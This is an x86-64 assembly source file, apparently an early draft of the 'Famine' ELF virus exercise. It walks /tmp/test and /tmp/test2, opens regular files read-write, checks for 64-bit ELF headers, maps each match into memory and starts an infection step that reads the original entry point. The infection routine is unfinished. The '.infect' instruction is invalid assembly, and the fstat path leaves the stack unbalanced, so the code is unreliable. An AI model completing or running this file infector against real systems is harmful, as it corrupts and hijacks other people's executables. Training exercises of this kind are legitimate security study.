%include "inc/famine.inc"

default rel

section .text
    ; Trazas
    hello db            "[+] Hello",10,0  ;11
    dir db              "[+] dir",10,0  ;9

    global _start
    dirs db         "/tmp/test",0,"/tmp/test2",0,0

    _start:
    mov rbp, rsp
    sub rbp, famine_size            ;generate stack

    ;load dirs
    lea rdi, [dirs]  
    
    .open_dir:
        ; rdi = dir name pointer
        mov r14, rdi
        mov VAR(famine.dir_name_pointer), rdi
        cmp byte [rdi], 0
        je .exit
        mov rax, SC_OPEN
        mov rsi, O_RDONLY | O_DIRECTORY
        syscall
        test rax, rax
        jl .next_dir
        mov VAR(famine.fd_dir), rax

        .dirent:
            mov rax, SC_GETDENTS64
            mov rdi, VAR(famine.fd_dir)
            lea rsi, VAR(famine.dirent_struc)
            mov rdx, 1024
            syscall
            test rax, rax
            jle .close_dir
            xor r12, r12            

        ; rdi = dirent_struct[0]
        ; r12 = offset to dirent_struc node
        ; rax = total bytes read in getdents
        .validate_files_types:
            cmp r12, rax
            jge .dirent
            lea rdi, VAR(famine.dirent_struc)
            add rdi, r12
            movzx ecx, word [rdi + dirent.d_len]
            add r12, rcx
            cmp byte [rdi + dirent.d_type], DT_REG
            jne .validate_files_types
            add rdi, dirent.d_name

            .openat:
                push rax
                lea rsi, [rdi]
                mov rdi, VAR(famine.fd_dir)
                mov rdx, O_RDWR 
                mov rax, SC_OPENAT
                syscall
                test rax, rax
                jle .skip_file
                mov VAR(famine.fd_file), rax
                
            .fstat:
                sub rsp, 144                ;fstat struct buffer
                mov rdi, rax
                lea rsi, [rsp]
                mov rax, SC_FSTAT
                syscall
                test rax, rax
                jl .end_fstat
                
                ; file type
                mov eax, dword [rsp + 24]   ; st-mode fstat struct 
                and eax, S_IFMT             ; bytes file type
                cmp eax, S_IFREG            ; reg file type
                jne .close_file
                mov rax, [rsp + 48]
                mov VAR(famine.file_original_len), rax 
                jmp .magic_numbers
                
                .end_fstat:
                    add rsp, 144
                    jmp .close_file 

            .magic_numbers:
                mov rdi, VAR(famine.fd_file)
                sub rsp, 64                     ;elf_ehdr struct buffer
                lea rsi, [rsp]
                ;lea rsi, VAR(famine.elf_ehdr)
                mov rdx, 64   
                mov rax, SC_READ
                syscall
                ; Magic numbers
                cmp dword [rsp], MAGIC_NUMBERS
                jne .exit_maigc_numbers
                ; 64 bits
                cmp byte [rsp + 4], 2     ;EI_CLASS
                jne .exit_maigc_numbers
                ; Little endian
                cmp byte [rsp + 5], 1     ;EI_DATA (little endian)
                jne .exit_maigc_numbers
                add rsp, 64
                jmp .mmap
            
                .exit_maigc_numbers:
                    add rsp, 64
                    jmp .close_file

            ; .fchmod:
            ;     mov rdi, VAR(famine.fd_file)
            ;     mov rsi, 0o777
            ;     mov rax, SC_FCHMOD
            ;     syscall

            .mmap:
                TRACE_TEXT hello, 11
                mov rdi, 0x0
                mov rsi, VAR(famine.file_original_len)
                mov rdx, PROT_READ | PROT_WRITE
                mov r10, 0x02
                mov r8, VAR(famine.fd_file)
                mov r9, 0x0
                mov rax, SC_MMAP
                syscall
                test rax, rax
                jle .close_file
                mov VAR(famine.mmap_pointer), rax 

            .infect:
                mov VAR(famine.original_entry), rax + elf64_ehdr.e_entry

            .close_file:
                mov rdi, VAR(famine.fd_file)
                mov rax, SC_CLOSE
                syscall

            ;.end_openat:
            ;    pop rax
                ; jmp .next_file

        ; .next_file:
        ;     cmp r12, rax
        ;     jge .validate_files_types
        
        .skip_file:
            pop rax
            jmp .validate_files_types

        .close_dir:
            mov rax, SC_CLOSE
            mov rdi, VAR(famine.fd_dir)
            syscall

        .next_dir:
            mov rsi, r14
        
        .find_null:
            lodsb               ; al = *rsi++
            test al, al
            jnz .find_null

            mov rdi, rsi
            cmp byte [rdi], 0   ; find double null
            jnz .open_dir

        .exit:
            mov rax, SC_EXIT
            syscall
    
    infect:
